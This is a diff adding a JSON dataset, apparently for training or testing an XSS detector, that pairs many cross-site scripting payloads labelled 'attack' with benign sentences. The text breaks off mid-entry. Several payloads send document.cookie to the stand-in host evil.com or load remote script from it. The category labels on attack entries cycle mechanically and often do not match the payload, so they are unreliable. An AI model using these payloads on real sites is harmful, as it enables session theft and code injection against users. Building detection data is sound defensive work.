@@ -1,0 +1,1784 @@
+[
+  {
+    "text": "<script>alert(1)</script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<ScRiPt>alert(1)</ScRiPt>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<SCRIPT SRC=//evil.com/x.js></SCRIPT>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<body onload=alert(1)>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<iframe src=javascript:alert(1)>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<a href=\"javascript:alert(1)\">x</a>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<marquee onstart=alert(1)>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<video><source onerror=alert(1)>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<audio src=x onerror=alert(1)>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "\"><script>alert(1)</script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "'><script>alert(1)</script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<object data=\"javascript:alert(1)\">",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<embed src=\"javascript:alert(1)\">",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<form action=\"javascript:alert(1)\"><input type=submit>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<link rel=stylesheet href=\"javascript:alert(1)\">",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<style>@import \"javascript:alert(1)\";</style>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<div style=\"background-image:url(javascript:alert(1))\">",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<img src=\"x\" onerror=\"eval(atob(`YWxlcnQoMSk=`))\">",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<iframe srcdoc=\"<script>parent.alert(1)</script>\">",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<math><maction actiontype=\"statusline#http://evil.com\" xlink:href=\"javascript:alert(1)\">",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>document.location=\"http://evil.com/?c=\"+document.cookie</script>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>new Image().src=\"http://evil.com/?c=\"+document.cookie</script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>fetch(\"http://evil.com\",{method:\"POST\",body:document.cookie})</script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onerror=alert;throw 1</script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>eval(\"alert(1)\")</script>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>Function(\"alert(1)\")()</script>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>setTimeout(\"alert(1)\",0)</script>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>window[\"alert\"](1)</script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>alert`1`</script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<table background=\"javascript:alert(1)\">",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<isindex action=\"javascript:alert(1)\">",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<base href=\"javascript:alert(1)//\">",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<bgsound src=\"javascript:alert(1)\">",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<body background=\"javascript:alert(1)\">",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<div onmouseover=alert(1)>hover</div>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<div onclick=alert(1)>click</div>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<div onmouseenter=alert(1)>enter</div>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<div onpointerdown=alert(1)>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<svg><animate onbegin=alert(1)>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<svg><set onbegin=alert(1)>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<keygen onfocus=alert(1) autofocus>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<select onfocus=alert(1) autofocus>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<textarea onfocus=alert(1) autofocus>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<button onfocus=alert(1) autofocus>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<output onfocus=alert(1) autofocus>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<meter onfocus=alert(1) autofocus>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<progress onfocus=alert(1) autofocus>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<dialog open onclose=alert(1)>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<menu type=context onshow=alert(1)><menuitem>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<track onerror=alert(1)>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<source onerror=alert(1) src=x>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<picture><img src=x onerror=alert(1)></picture>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<map><area href=\"javascript:alert(1)\">",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<form><button formaction=\"javascript:alert(1)\">",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<form><input formaction=\"javascript:alert(1)\" type=submit>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<video poster=\"javascript:alert(1)\">",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<audio controls onplay=alert(1)>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<marquee width=1 onstart=alert(1)>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<listing onstart=alert(1)>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<xmp onmouseover=alert(1)>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<plaintext onmouseover=alert(1)>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<nobr onmouseover=alert(1)>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<noembed onmouseover=alert(1)>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<noframes onmouseover=alert(1)>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<noscript onmouseover=alert(1)>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<a href=\"data:text/html,<script>alert(1)</script>\">",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<img src=\"data:text/html,<script>alert(1)</script>\">",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script src=\"data:text/javascript,alert(1)\"></script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script type=\"module\">import\"data:text/javascript,alert(1)\"</script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>location=\"javascript:alert(1)\"</script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>open(\"javascript:alert(1)\")</script>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>history.pushState(null,\"\",\"javascript:alert(1)\")</script>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>navigator.sendBeacon(\"http://evil.com\",document.cookie)</script>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>XMLHttpRequest.prototype.open=function(){alert(1)}</script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>Object.defineProperty(document,\"cookie\",{get:function(){alert(1)}})</script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>window.name=\"<img src=x onerror=alert(1)>\"</script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>constructor.constructor(\"alert(1)\")()</script>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>[].constructor.constructor(\"alert(1)\")()</script>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>({}).constructor.constructor(\"alert(1)\")()</script>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>([]).constructor.constructor(\"alert(1)\")()</script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>(function(){}).constructor(\"alert(1)\")()</script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>globalThis[\"alert\"](1)</script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>self[\"alert\"](1)</script>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>top[\"alert\"](1)</script>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>parent[\"alert\"](1)</script>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>frames[\"alert\"](1)</script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>this[\"alert\"](1)</script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>alert(1)//</script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>alert(1)<!--</script>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>alert(1)</script><script>alert(2)</script>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script src=\"http://evil.com/x.js\"></script>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script src=\"https://evil.com/x.js\"></script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script src=\"/\\evil.com/x.js\"></script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script src=\"\\evil.com/x.js\"></script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script src=\"javascript:alert(1)\"></script>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script nonce=\"\">alert(1)</script>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script integrity=\"\">alert(1)</script>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script crossorigin=\"\">alert(1)</script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script defer async alert(1)></script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>throw onerror=alert,1</script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>{onerror=alert}throw 1</script>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>window.onerror=alert;throw 1</script>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>addEventListener(\"error\",alert);throw 1</script>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>addEventListener(\"unhandledrejection\",alert);Promise.reject(1)</script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onload=alert</script><img src=x>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onpageshow=alert</script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onbeforeunload=alert</script>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onunload=alert</script>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onhashchange=alert</script>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onpopstate=alert</script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onstorage=alert</script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onmessage=alert</script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>ononline=alert</script>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onoffline=alert</script>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onfocus=alert</script>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onblur=alert</script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onresize=alert</script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onscroll=alert</script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onkeydown=alert</script>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onkeyup=alert</script>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onkeypress=alert</script>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onclick=alert</script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>ondblclick=alert</script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onmousedown=alert</script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onmouseup=alert</script>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onmousemove=alert</script>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onmouseout=alert</script>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onmouseover=alert</script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onmouseenter=alert</script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onmouseleave=alert</script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>oncontextmenu=alert</script>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onwheel=alert</script>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>oncopy=alert</script>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>oncut=alert</script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onpaste=alert</script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>oninput=alert</script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onchange=alert</script>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onsubmit=alert</script>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onreset=alert</script>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>oninvalid=alert</script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onsearch=alert</script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onselect=alert</script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onselectstart=alert</script>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onselectionchange=alert</script>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onabort=alert</script>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>oncanplay=alert</script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>oncanplaythrough=alert</script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>oncuechange=alert</script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>ondurationchange=alert</script>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onemptied=alert</script>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onended=alert</script>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onloadeddata=alert</script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onloadedmetadata=alert</script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onloadstart=alert</script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onpause=alert</script>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onplay=alert</script>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onplaying=alert</script>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onprogress=alert</script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onratechange=alert</script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onseeked=alert</script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onseeking=alert</script>",
+    "label": "attack",
+    "category": "data_uri",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onstalled=alert</script>",
+    "label": "attack",
+    "category": "encoded_js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onsuspend=alert</script>",
+    "label": "attack",
+    "category": "dom_mutation",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>ontimeupdate=alert</script>",
+    "label": "attack",
+    "category": "script_tag",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onvolumechange=alert</script>",
+    "label": "attack",
+    "category": "event_handler",
+    "source": "template-xss"
+  },
+  {
+    "text": "<script>onwaiting=alert</script>",
+    "label": "attack",
+    "category": "js_protocol",
+    "source": "template-xss"
+  },
+  {
+    "text": "Use the <strong> tag for bold text.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "My favorite JavaScript framework is Vue.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Embed the map with an iframe on our contact page.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "The onload event fires when the page is ready.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Alert the team about the outage immediately.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Use markdown **bold** instead of raw HTML tags.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Object-oriented programming uses classes.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Set a data attribute on the DOM element.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Add a base URL in the <head> section.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Style headings with CSS for better readability.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "We discuss script writing in our film class.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "The prompt asked for my email address.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Confirm your email before continuing registration.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "The union rep will join the meeting.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Select all that apply on the survey form.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Drop me a line when you are free.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Insert the coupon code at checkout.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Update the spreadsheet from the CSV export.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Delete the duplicate row manually.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Convert the string value to an integer.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Where is the nearest subway station?",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Execute the deployment plan from the runbook.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Cast your vote before polls close.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Declare your intentions clearly in writing.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "From the table we can see revenue trends.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "She will convert and insert the images.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "The recipe says to select fresh herbs.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Ignore typos - English is my second language.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Simulate traffic in the staging environment only.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Explain XSS vectors in my homework.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "The script tag in HTML differs from film scripts.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "JavaScript is not the same as Java.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "We use onclick handlers in React legitimately.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "onerror is documented as a media event.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "fetch() is the standard HTTP client API.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "document.cookie is HttpOnly in our app.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "SVG is a vector graphics format.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "MathML encodes mathematical notation.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "The marquee element is deprecated in HTML5.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Details/summary is a disclosure widget.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Video and audio elements support media playback.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Form action should target your backend.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Meta refresh is discouraged for accessibility.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Link rel=stylesheet loads CSS.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Style tags belong in head or scoped components.",
